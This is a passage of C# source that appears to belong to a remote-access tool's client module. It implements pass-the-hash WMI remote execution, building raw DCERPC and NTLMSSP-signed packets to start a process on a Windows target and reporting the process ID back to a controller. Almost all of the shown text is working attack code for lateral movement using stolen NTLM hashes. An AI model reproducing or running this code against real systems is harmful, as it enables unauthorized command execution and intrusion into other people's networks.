0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x00, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x03, 0x00, 0x00, 0x00, 0x57, 0x4d, 0x49, 0x7c, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x66, 0x03, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44, 0x03, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xf5, 0x03, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x66, 0x03, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44, 0x03, 0x00, 0x00, 0xad, 0x03, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3a, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70 });
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[501]);
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, command_length);
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01 });
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, command_length2);
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x80, 0x00, 0x5f, 0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45, 0x52, 0x53, 0x00, 0x00 });
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, command_bytes);
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                            if (stub_data.Length < request_split_index)
                                                            {
                                                                request_flags = new byte[] { 0x83 };
                                                                WMI_client_stage_next = "Result";
                                                            }
                                                            else
                                                            {
                                                                request_split = true;
                                                                double request_split_stage_final = Math.Ceiling((double)stub_data.Length / request_split_index);
                                                                if (request_split_stage < 2)
                                                                {
                                                                    request_length = stub_data.Length;
                                                                    stub_data = PTHWMIExecHelper.getByteRange(stub_data, 0, request_split_index - 1);
                                                                    request_split_stage = 2;
                                                                    sequence_number_counter = 10;
                                                                    request_flags = new byte[] { 0x81 };
                                                                    request_split_index_tracker = request_split_index;
                                                                    WMI_client_stage_next = "Request";
                                                                }
                                                                else if (request_split_stage == request_split_stage_final)
                                                                {
                                                                    request_split = false;
                                                                    sequence_number = BitConverter.GetBytes(sequence_number_counter);
                                                                    request_split_stage = 0;
                                                                    stub_data = PTHWMIExecHelper.getByteRange(stub_data, request_split_index_tracker, stub_data.Length);
                                                                    request_flags = new byte[] { 0x82 };
                                                                    WMI_client_stage_next = "Result";
                                                                }
                                                                else
                                                                {
                                                                    request_length = stub_data.Length - request_split_index_tracker;
                                                                    stub_data = PTHWMIExecHelper.getByteRange(stub_data, request_split_index_tracker, request_split_index_tracker + request_split_index - 1);
                                                                    request_split_index_tracker += request_split_index;
                                                                    request_split_stage++;
                                                                    sequence_number = BitConverter.GetBytes(sequence_number_counter);
                                                                    sequence_number_counter++;
                                                                    request_flags = new byte[] { 0x80 };
                                                                    WMI_client_stage_next = "Request";
                                                                }
                                                            }


                                                        }

                                                    }
                                                    break;



                                            }

                                            packet_RPC = PTHWMIExecHelper.GetPacketRPCRequest(request_flags, stub_data.Length, 16, request_auth_padding, request_call_ID, request_context_ID, request_opnum, request_UUID);

                                            if (request_split)
                                            {
                                                packet_RPC["RPCRequest_AllocHint"] = BitConverter.GetBytes(request_length);
                                            }

                                            packet_NTLMSSP_verifier = PTHWMIExecHelper.GetPacketNTLMSSPVerifier(request_auth_padding, new byte[] { 0x04 }, sequence_number);
                                            RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                                            NTLMSSP_verifier = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                                            RPC_Sign = PTHWMIExecHelper.CombineByteArray(sequence_number, RPC);
                                            RPC_Sign = PTHWMIExecHelper.CombineByteArray(RPC_Sign, stub_data);
                                            RPC_Sign = PTHWMIExecHelper.CombineByteArray(RPC_Sign, PTHWMIExecHelper.getByteRange(NTLMSSP_verifier, 0, request_auth_padding + 7));
                                            RPC_signature = HMAC_MD5.ComputeHash(RPC_Sign);
                                            RPC_signature = PTHWMIExecHelper.getByteRange(RPC_signature, 0, 7);
                                            packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = RPC_signature;
                                            NTLMSSP_verifier = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                                            WMI_client_send = PTHWMIExecHelper.CombineByteArray(RPC, stub_data);
                                            WMI_client_send = PTHWMIExecHelper.CombineByteArray(WMI_client_send, NTLMSSP_verifier);
                                            WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                                            WMI_client_random_port_stream.Flush();

                                            if (!request_split)
                                            {
                                                WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                            }

                                            while (WMI_client_random_port_stream.DataAvailable)
                                            {
                                                WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                                Thread.Sleep(sleep);
                                            }
                                            WMI_client_stage = WMI_client_stage_next;

                                        }
                                        break;
                                    case "Result":
                                        {
                                            while (WMI_client_random_port_stream.DataAvailable)
                                            {
                                                WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                                Thread.Sleep(sleep);
                                            }

                                            if (WMI_client_receive[1145] != 9)
                                            {
                                                int target_process_ID = PTHWMIExecHelper.DataLength2(1141, WMI_client_receive);
                                                new Packets.ClientPackets.DoWMIExecResponse("Process started with process ID " + target_process_ID, true).Execute(client);
                                            }
                                            else
                                            {
                                                new Packets.ClientPackets.DoWMIExecResponse("Process did not start, check your command", false).Execute(client);
                                            }

                                            WMI_client_stage = "exit";
                                        }
                                        break;

                                }
                                Thread.Sleep(sleep);
                            }
                            WMI_client_random_port.Close();
                            WMI_client_random_port_stream.Close();
                        }

                    }
                    WMI_client.Close();
                    WMI_client_stream.Close();
                }
            }).Start();
            }
    }
}
